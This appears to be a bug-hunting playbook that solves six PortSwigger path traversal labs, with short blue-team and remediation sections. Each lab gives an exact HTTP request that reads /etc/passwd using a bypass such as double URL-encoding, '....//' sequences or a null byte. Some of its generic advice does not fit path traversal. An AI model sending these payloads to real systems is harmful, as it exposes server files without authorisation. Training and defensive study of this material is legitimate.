---
name: "Path Traversal — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1083"]
tools: [burp-suite, curl, sqlmap, ffuf, python, hashcat, ysoserial]
difficulty: "advanced"
---

# Path Traversal — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- BSCP certification prep
- Real-world bug bounty hunting
- Building exploitation chains
- Understanding bypass techniques

## Prerequisites
- Burp Suite Professional
- Burp Collaborator / interactsh
- Browser with proxy configured


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: Simple case 🟢 APPRENTICE
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
```
---

### Lab 2: Blocked with absolute path bypass 🟡 PRACTITIONER
```http
GET /image?filename=/etc/passwd HTTP/1.1
```
Traversal sequences blocked but absolute paths work.
---

### Lab 3: Stripped non-recursively 🟡 PRACTITIONER
```http
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
```
Stripping `../` once from `....//` leaves `../`.
---

### Lab 4: Stripped with superfluous URL-decode 🟡 PRACTITIONER
```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
```
Double URL-encode: `..%252f` → decoded to `..%2f` → decoded again to `../`.
---

### Lab 5: Validation of start of path 🟡 PRACTITIONER
```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
```
App validates path starts with `/var/www/images` — traverse from there.
---

### Lab 6: File extension with null byte 🟡 PRACTITIONER
```http
GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
```
Null byte terminates string in C/older PHP. App validates `.png` extension but OS stops at `%00`.
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research
When standard technique fails:
1. Identify the filter/WAF
2. Fuzz with Burp Intruder custom wordlists
3. Search GitHub/Twitter for new bypasses
4. Chain with other vulns for escalation
5. Try encoding variants: URL, double-URL, unicode, hex


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
